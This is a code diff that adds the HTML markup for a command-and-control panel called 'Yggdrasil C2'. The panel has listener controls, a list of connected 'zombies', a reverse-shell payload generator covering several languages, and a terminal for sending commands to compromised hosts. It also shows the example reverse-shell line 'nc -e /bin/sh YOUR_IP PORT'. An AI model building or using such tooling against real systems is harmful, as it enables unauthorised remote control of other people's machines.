@@ -1,0 +1,70 @@
+<div id="c2Modal" class="odin-modal" style="display:none;">
+    <div class="modal-content" style="max-width: 1100px; max-height: 90vh;">
+        <div class="modal-header" style="display: flex; justify-content: space-between; align-items: center;">
+            <h2>ᛉ YGGDRASIL C2 — COMMAND & CONTROL</h2>
+            <span onclick="closeC2Modal()" style="cursor:pointer; font-size:20px;">&times;</span>
+        </div>
+        <div class="modal-body" style="display: flex; gap: 15px; height: 70vh;">
+            <div style="width: 300px; min-width: 300px; border-right: 1px solid rgba(136,192,208,0.2); padding-right: 10px; overflow-y: auto;">
+                <div style="margin-bottom: 15px;">
+                    <h4 style="color: #88c0d0; margin: 0 0 8px 0; font-size: 12px; letter-spacing: 1px;">ᛚ LISTENERS</h4>
+                    <div id="c2ListenersList" style="font-size: 11px; margin-bottom: 8px;">
+                        <div style="color: var(--text-dim); font-style: italic;">No active listeners</div>
+                    </div>
+                    <div style="display: flex; gap: 5px;">
+                        <input type="number" id="c2ListenerPort" placeholder="Port" value="4444" style="width: 70px; font-size: 11px; padding: 4px; background: rgba(0,0,0,0.4); color: #88c0d0; border: 1px solid rgba(136,192,208,0.3);">
+                        <input type="text" id="c2ListenerName" placeholder="Name" value="Main" style="flex:1; font-size: 11px; padding: 4px; background: rgba(0,0,0,0.4); color: #88c0d0; border: 1px solid rgba(136,192,208,0.3);">
+                        <button onclick="startC2Listener()" style="font-size: 10px; padding: 4px 8px; border-color: #4CAF50; color: #4CAF50;">START</button>
+                    </div>
+                </div>
+
+                <div style="margin-bottom: 15px;">
+                    <h4 style="color: #bf616a; margin: 0 0 8px 0; font-size: 12px; letter-spacing: 1px;">ᚾ ACTIVE ZOMBIES</h4>
+                    <div id="c2ZombiesList" style="font-size: 11px; max-height: 300px; overflow-y: auto;">
+                        <div style="color: var(--text-dim); font-style: italic;">No zombies connected</div>
+                    </div>
+                </div>
+
+                <div style="margin-top: 15px; border-top: 1px solid rgba(235,203,139,0.2); padding-top: 10px;">
+                    <h4 style="color: #ebcb8b; margin: 0 0 8px 0; font-size: 12px; letter-spacing: 1px;">ᛊ QUICK PAYLOAD</h4>
+                    <div style="display: flex; flex-direction: column; gap: 5px;">
+                        <input type="text" id="c2PayloadIP" placeholder="Your IP" style="font-size: 11px; padding: 4px; background: rgba(0,0,0,0.4); color: #ebcb8b; border: 1px solid rgba(235,203,139,0.3);">
+                        <select id="c2PayloadType" style="font-size: 11px; padding: 4px; background: rgba(0,0,0,0.4); color: #ebcb8b; border: 1px solid rgba(235,203,139,0.3);">
+                            <option value="python">Python</option>
+                            <option value="python3">Python3</option>
+                            <option value="bash">Bash</option>
+                            <option value="nc">Netcat (nc -e)</option>
+                            <option value="nc_mkfifo">Netcat (mkfifo)</option>
+                            <option value="php">PHP</option>
+                            <option value="ruby">Ruby</option>
+                            <option value="perl">Perl</option>
+                            <option value="powershell">PowerShell</option>
+                        </select>
+                        <button onclick="generateC2Payload()" style="font-size: 10px; padding: 4px; border-color: #ebcb8b; color: #ebcb8b;">GENERATE</button>
+                    </div>
+                    <div id="c2PayloadOutput" style="margin-top: 8px; font-family: monospace; font-size: 10px; word-break: break-all; max-height: 120px; overflow-y: auto; padding: 4px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); display: none;"></div>
+                </div>
+            </div>
+
+            <div style="flex: 1; display: flex; flex-direction: column;">
+                <div id="c2TerminalHeader" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                    <span id="c2TerminalTitle" style="color: #88c0d0; font-size: 12px; font-family: monospace;">Select a zombie to interact...</span>
+                    <button id="c2DisconnectBtn" onclick="c2DisconnectSelected()" style="font-size: 10px; padding: 3px 8px; border-color: #bf616a; color: #bf616a; display: none;">DISCONNECT</button>
+                </div>
+                <div id="c2Terminal" style="flex: 1; background: #05070a; border: 1px solid rgba(136,192,208,0.3); border-radius: 4px; padding: 10px; font-family: 'Courier New', monospace; font-size: 12px; color: #c0caf5; overflow-y: auto; white-space: pre-wrap; word-break: break-all; min-height: 300px;">
+                    <div style="color: var(--text-dim); text-align: center; padding: 50px;">
+                        <p style="font-size: 40px;">ᛉ</p>
+                        <p>Start a listener and wait for reverse shell connections...</p>
+                        <p style="font-size: 10px; color: #666;">Netcat example: nc -e /bin/sh YOUR_IP PORT</p>
+                    </div>
+                </div>
+                <div style="display: flex; gap: 5px; margin-top: 8px;">
+                    <input type="text" id="c2CommandInput" placeholder="Enter command to execute on zombie..."
+                           style="flex: 1; font-family: monospace; font-size: 13px; padding: 6px 10px; background: rgba(0,0,0,0.5); color: #a3be8c; border: 1px solid rgba(163,190,140,0.3);"
+                           onkeydown="if(event.key==='Enter') c2SendCommand();">
+                    <button onclick="c2SendCommand()" style="font-size: 12px; padding: 6px 15px; border-color: #a3be8c; color: #a3be8c;">SEND</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
